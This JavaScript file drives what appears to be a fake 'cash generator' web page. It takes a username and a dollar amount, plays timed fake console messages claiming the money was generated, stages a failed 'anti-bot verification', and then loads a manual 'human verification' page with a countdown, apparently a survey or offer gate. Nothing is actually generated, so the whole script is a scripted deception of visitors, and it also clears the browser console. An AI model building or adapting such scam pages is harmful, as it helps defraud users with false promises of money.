$(document).ready(function() {

	////////////////
	// Console Messages
	//////////////// 
	var $console_currency = "$";
	var $console_msg_1 = "Connecting to account";
	var $console_msg_2 = "Fetching data...";
	var $console_msg_3 = "Generating";
	var $console_msg_4 = "Succesfully generated";
	var $console_msg_5 = "Performing Anti-bot Verification...";
	var $console_msg_6 = "Anti-bot Verification Failed";
	var $console_msg_7 = "Please Verify Manually";
	  
	////////////////
	// Cash Values
	//////////////// 
	var resource_1_value_min = 25;
	var resource_1_value_max = 100;
	var $resource_1_value_1 = '25';
	var $resource_1_value_2 = '50';
	var $resource_1_value_3 = '75';
	var $resource_1_value_4 = '100';
	
	// Human Verification Timer
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	// Sound Settings: 1 = ON | 0 = OFF
	$sound_setting = 1;		
	ion.sound({
		sounds: [
			{
				name: "button",
				path: "audio/",
				volume: 1
			},
			{
				name: "transition-1",
				path: "audio/",
				volume: 0.9
			},
			{
				name: "count",
				path: "audio/",
				loop: true,
				volume: 0.7
			},
			{
				name: "fail",
				path: "audio/",
				volume: 0.7
			},
			{
				name: "transition-2",
				path: "audio/",
				volume: 0.7
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});
	
	
	$("#go-b-1").click(function() {
		ion.sound.play("button");	
		if ($('#input-user-info').val().length <= 2) {
			$(".input-wrapper").addClass('shake animated').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');				
			});	
			$(".input-error-notice").addClass('now-seen animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('animated fadeInUp now-seen');
			});	
		}
		else if ($('#input-user-info').val().length >= 2) {
			console_username = $('#input-user-info').val();
			process();
		}
	});
	
	function process() {
		$.ajax({
			type: "GET",
			url: "parts/cash_select.php",
			success: function(dataprocess){
				$('.M550i').html(dataprocess);
				$.magnificPopup.open({
					items: {
						src: '.popup-wrapper',
					},
					type: 'inline',
					preloader: false,
					modal: true,
					mainClass: 'animated slideInUp',
					fixedContentPos: true,
					fixedBgPos: true,
					callbacks: {	
						beforeOpen: function() {
							if ($sound_setting == 1) {
								ion.sound.play("transition-2");
							}
						},
						open: function() {
							$('#resource-val').html($resource_1_value_1);	
							var select = $( "#selected-amount-wrapper" );				
							var slider = $( "<div id='slider-resource-1'></div>" ).insertAfter( select ).slider({
								min: resource_1_value_min,
								max: resource_1_value_max,
								value: resource_1_value_min,
								range: "min",
								change: function(event, ui) { 
									var sliderValue = $( "#slider-resource-1" ).slider( "option", "value" );				
									$('#resource-val').html(sliderValue);
									if(sliderValue == $resource_1_value_1) {
										$('#decrease-resource-1').addClass('resource-button-n-a');			
									}
									else if (sliderValue == $resource_1_value_2) {
										$('#decrease-resource-1').removeClass('resource-button-n-a');
									}
									else if (sliderValue == $resource_1_value_3) {
										$('#increase-resource-1').removeClass('resource-button-n-a');
									}
									else if (sliderValue == $resource_1_value_4) {
										$('#increase-resource-1').addClass('resource-button-n-a');
									}
								}        
							});	
							$('#increase-resource-1').click(function() {
								var sliderCurrentValue = $( "#slider-resource-1" ).slider( "option", "value" );								
								if(sliderCurrentValue == $resource_1_value_1) {					
									slider.slider( "value", $resource_1_value_2 );	
									ion.sound.play("button");
								}								
								if(sliderCurrentValue == $resource_1_value_2) {
									slider.slider( "value", $resource_1_value_3 );	
									ion.sound.play("button");
								}								
								if(sliderCurrentValue == $resource_1_value_3) {
									slider.slider( "value", $resource_1_value_4 );	
									ion.sound.play("button");	
								}								
							});	
							$('#decrease-resource-1').click(function() {
								var sliderCurrentValue = $( "#slider-resource-1" ).slider( "option", "value" );
								if(sliderCurrentValue == $resource_1_value_4) {
									slider.slider( "value", $resource_1_value_3 );	
									ion.sound.play("button");					
								}
								if(sliderCurrentValue == $resource_1_value_3) {
									slider.slider( "value", $resource_1_value_2 );
									ion.sound.play("button");	
								}
								if(sliderCurrentValue == $resource_1_value_2) {
									slider.slider( "value", $resource_1_value_1 );
									ion.sound.play("button");
								}
								if(sliderCurrentValue == $resource_1_value_1) {
									$('#decrease-resource-1').addClass('resource-button-n-a');		
								}								
							});
							$('#go-b-2').click(function() {
								if ($sound_setting == 1) {
									ion.sound.play("button");
								}	
								var $selected_amount = $('#slider-resource-1').slider("option", "value");
								$.ajax({
									type: "GET",
									url: "parts/console.php",
									success: function(dataprocess){
										$('.popup-content').html(dataprocess);
										if ($sound_setting == 1) {
											ion.sound.play("transition-2");
										}
										var $console_msg = ".console-msg";
										$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});	
										$($console_msg).html($console_msg_1);
										$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated fadeInUp');	
										});
										setTimeout(function() {
											$($console_msg).html($console_msg_2);
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
										}, 2000 );
										setTimeout(function() {
											$($console_msg).html($console_msg_3 + ' ' + $console_currency + ' ' + $selected_amount);
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
											$(".console-loader-wrapper").fadeOut(function(){	
												$('.con-r1-gen').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
													$(this).removeClass('animated bounceIn');	
												});	
												$(".con-r1-gen").fadeIn(function(){														
													if ($sound_setting == 1) {
														ion.sound.play("count");
													}
													$('.con-r1-gen-val').countTo({
														from: 0,
														to: $selected_amount,
														speed: 5000,
														refreshInterval: 25,
														formatter: function (value, options) {
															return value.toFixed(options.decimals);
														}, 
														onComplete: function (value, options) {
															if ($sound_setting == 1) {
																ion.sound.pause("count");
															}
														}
													});
												});										
											});										
										}, 4500 );
										setTimeout(function() {
											$(".con-r1-gen").fadeOut(function(){																							
												$(".console-loader-wrapper").fadeIn();										
											});				
											if ($sound_setting == 1) {
												ion.sound.play("transition-1");
											}
											$(".console-loader-wrapper").html('<span class="lnr lnr-checkmark-circle"></span>');
											$($console_msg).html('<span class="console-msg-success">' + $console_msg_4 + '</span>');	
											$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});	
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
										}, 8500 );
										setTimeout(function() {																							
											$(".console-loader-wrapper").html('<span class="lnr lnr-cog fa-spin"></span>');
											$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});	
											$($console_msg).html($console_msg_5);
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
										}, 10500 );
										setTimeout(function() {
											if ($sound_setting == 1) {
												ion.sound.play("fail");
											}
											$(".console-loader-wrapper").html('<span class="lnr lnr-cross-circle"></span>');
											$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});	
											$($console_msg).html('<span class="console-msg-error">' + $console_msg_6 + '</span>');
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
										}, 12500 );	
										setTimeout(function() {
											$(".console-loader-wrapper").html('<span class="lnr lnr-warning"></span>');
											$('.console-loader-wrapper').addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});	
											$($console_msg).html($console_msg_7);
											$($console_msg).addClass('animated fadeInUp').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated fadeInUp');	
											});
										}, 14500 );	
										setTimeout(function() {
											$.ajax({
												type: "get",
												url: "parts/verification.php",
												success: function(dataprocess){		
													if ($sound_setting == 1) {
														ion.sound.play("transition-2");
													}
													console.clear();
													console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
													$('.popup-wrapper').html(dataprocess).hide().fadeIn();													
													human_verification_timer.init($human_verification_timer_value);	
												}
											});														
										}, 16500 );
									}
								});
							});
						}
					}
				});
			}
		});	
	}
});
function rng(min, max) {
	return Math.floor(Math.random() * (max - min + 1) + min);

}
function Random(_0xaa63x2, _0xaa63x3) {
	return Math['floor'](Math['random']() * (_0xaa63x3 - _0xaa63x2) + _0xaa63x2);
};

var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();